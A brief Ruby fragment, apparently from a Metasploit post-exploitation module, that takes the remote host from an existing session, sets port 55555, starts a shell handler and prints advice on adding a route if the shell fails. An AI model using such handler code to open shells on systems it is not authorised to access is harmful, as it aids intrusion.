rhost = @client.session_host
rport = 55555

set_handler(rhost,rport)
print_status("If a shell is unsuccesful, ensure you have access to the target host and port. Maybe you need to add a route (route add ?)")





